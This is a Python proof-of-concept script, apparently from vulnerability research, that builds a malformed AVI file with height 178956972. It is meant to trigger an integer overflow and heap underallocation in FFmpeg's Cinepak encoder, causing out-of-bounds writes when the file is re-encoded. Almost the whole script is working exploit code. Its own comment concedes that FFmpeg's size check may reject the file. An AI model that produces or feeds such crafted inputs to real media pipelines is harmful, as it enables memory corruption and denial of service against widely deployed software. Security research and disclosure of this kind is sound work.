#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Integer Overflow -> Heap Underalloc in cinepak_encode_init
(libavcodec/cinepakenc.c lines 181-188)

Creates a minimal AVI file with width=4, height=178956972.
When ffmpeg re-encodes this with -c:v cinepak, the encoder init computes:
  6 * (4 * 178956972) = 6 * 715827888 = 4294967328
which overflows int32 and wraps to 32, giving 32>>2 = 8 elements
allocated for codebook_input and pict_bufs (8 bytes each),
causing OOB heap writes during encoding of ~44M macroblocks.

NOTE: FFmpeg's av_image_check_size2() may reject these dimensions due to
the stride*(h+128) >= INT_MAX check. If so, we fall back to the lavfi
approach in the run script.
"""
import struct
import sys
import os

# Trigger dimensions: 6*(4*178956972)=4294967328 overflows int32 to 32, >>2 = 8
WIDTH = 4
HEIGHT = 178956972
FPS = 25

def pack4(s):
    """Return 4 ASCII bytes."""
    return s.encode('ascii')[:4]

def chunk(fourcc, data):
    """RIFF chunk: fourcc(4) + size(4LE) + data"""
    b = data if isinstance(data, bytes) else bytes(data)
    return fourcc.encode('ascii') + struct.pack('<I', len(b)) + b

def list_chunk(subtype, data):
    """RIFF LIST chunk"""
    b = data if isinstance(data, bytes) else bytes(data)
    return b'LIST' + struct.pack('<I', 4 + len(b)) + subtype.encode('ascii') + b

def riff_chunk(riff_type, data):
    """RIFF root chunk"""
    b = data if isinstance(data, bytes) else bytes(data)
    return b'RIFF' + struct.pack('<I', 4 + len(b)) + riff_type.encode('ascii') + b

# ---- AVIMAINHEADER (avih, 56 bytes) ----
avih_data = struct.pack('<IIIIIIIIIIIIII',
    1000000 // FPS,   # dwMicroSecPerFrame
    0,                # dwMaxBytesPerSec
    0,                # dwPaddingGranularity
    0x10,             # dwFlags: AVIF_HASINDEX
    1,                # dwTotalFrames
    0,                # dwInitialFrames
    1,                # dwStreams
    0,                # dwSuggestedBufferSize
    WIDTH,            # dwWidth
    HEIGHT,           # dwHeight
    0, 0, 0, 0,       # dwReserved[4]
)
assert len(avih_data) == 56, f"avih must be 56 bytes, got {len(avih_data)}"

# ---- AVISTREAMHEADER (strh, 56 bytes) ----
strh_data = (
    b'vids' +         # fccType
    b'CVID' +         # fccHandler (Cinepak)
    struct.pack('<I', 0) +   # dwFlags
    struct.pack('<HH', 0, 0) +  # wPriority, wLanguage
    struct.pack('<I', 0) +   # dwInitialFrames
    struct.pack('<I', 1) +   # dwScale
    struct.pack('<I', FPS) + # dwRate
    struct.pack('<I', 0) +   # dwStart
    struct.pack('<I', 1) +   # dwLength (1 frame)
    struct.pack('<I', 0) +   # dwSuggestedBufferSize
    struct.pack('<I', 0xFFFFFFFF) +  # dwQuality (-1 = default)
    struct.pack('<I', 0) +   # dwSampleSize
    struct.pack('<hhhh', 0, 0, WIDTH & 0x7FFF, 0)  # rcFrame (HEIGHT doesn't fit in int16; rcFrame is display rect only)
)
assert len(strh_data) == 56, f"strh must be 56 bytes, got {len(strh_data)}"

# ---- BITMAPINFOHEADER (strf, 40 bytes) ----
# biSizeImage = WIDTH * HEIGHT * 3 — may overflow DWORD but that's the point
# For CVID format, biSizeImage is often 0
bmp_data = struct.pack('<IiiHHIIiiII',
    40,               # biSize
    WIDTH,            # biWidth
    HEIGHT,           # biHeight (positive = bottom-up)
    1,                # biPlanes
    24,               # biBitCount
    0x44495643,       # biCompression = 'CVID' in little-endian
    0,                # biSizeImage (0 = computed)
    0,                # biXPelsPerMeter
    0,                # biYPelsPerMeter
    0,                # biClrUsed
    0,                # biClrImportant
)
assert len(bmp_data) == 40, f"BITMAPINFOHEADER must be 40 bytes, got {len(bmp_data)}"

# ---- Build strl LIST ----
strl_data = (
    chunk('strh', strh_data) +
    chunk('strf', bmp_data)
)
strl_list = list_chunk('strl', strl_data)

# ---- Build hdrl LIST ----
hdrl_data = chunk('avih', avih_data) + strl_list
hdrl_list = list_chunk('hdrl', hdrl_data)

# ---- Minimal Cinepak frame (dummy): just zeros ----
# A minimal cinepak frame header is 10 bytes:
#   codec_type(1) + data_size(3) + width(2) + height(2) + num_strips(2)
# We set codec_type=0x11 (key frame), data_size=10, width=4, height=4, strips=0
frame_data = struct.pack('>BHxHHH',
    0x11,             # codec_type: key frame
    10,               # data_size hi word (big-endian 3-byte)
    4,                # width
    4,                # height
    0,                # num_strips
)
# Actually cinepak header is: codec_type(1), data_len(3 bytes big-endian), width(2), height(2), num_strips(2)
# Let's build it manually as bytes
frame_data = bytes([
    0x11,             # codec_type = key frame
    0x00, 0x00, 0x0A, # data_len = 10 (3 bytes big-endian)
    0x00, 0x04,       # width = 4
    0x00, 0x04,       # height = 4 (small, won't matter since encoder uses avctx dims)
    0x00, 0x00,       # num_strips = 0
])

# ---- Build movi LIST ----
movi_data = chunk('00dc', frame_data)
movi_list = list_chunk('movi', movi_data)

# ---- idx1 chunk (one entry) ----
# Each entry: chunk_id(4) + flags(4) + offset(4) + size(4)
# offset is relative to movi data start (after "movi" tag = 4 bytes)
# the 00dc chunk starts at offset 4 (after "movi" FOURCC)
idx1_data = (
    b'00dc' +
    struct.pack('<III',
        0x10,                    # AVIIF_KEYFRAME
        4,                       # offset from start of movi data
        len(frame_data),         # size
    )
)
idx1_chunk = chunk('idx1', idx1_data)

# ---- Assemble full AVI ----
avi_body = hdrl_list + movi_list + idx1_chunk
avi_file = riff_chunk('AVI ', avi_body)

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.avi')
with open(output_path, 'wb') as f:
    f.write(avi_file)

print(f"[+] Written {len(avi_file)} bytes to {output_path}")
print(f"[+] AVI dimensions: {WIDTH}x{HEIGHT}")
print(f"[+] Expected overflow: 6*{WIDTH}*{HEIGHT} = {6*WIDTH*HEIGHT} (int32 wraps to {(6*WIDTH*HEIGHT) & 0xFFFFFFFF} → signed {((6*WIDTH*HEIGHT) & 0xFFFFFFFF) - (1<<32) if (6*WIDTH*HEIGHT) & 0xFFFFFFFF >= (1<<31) else (6*WIDTH*HEIGHT) & 0xFFFFFFFF})")
print(f"[+] Overflowed >> 2 = {(((6*WIDTH*HEIGHT) & 0xFFFFFFFF) if ((6*WIDTH*HEIGHT) & 0xFFFFFFFF) < (1<<31) else ((6*WIDTH*HEIGHT) & 0xFFFFFFFF) - (1<<32)) >> 2}")
print("[+] Done.")
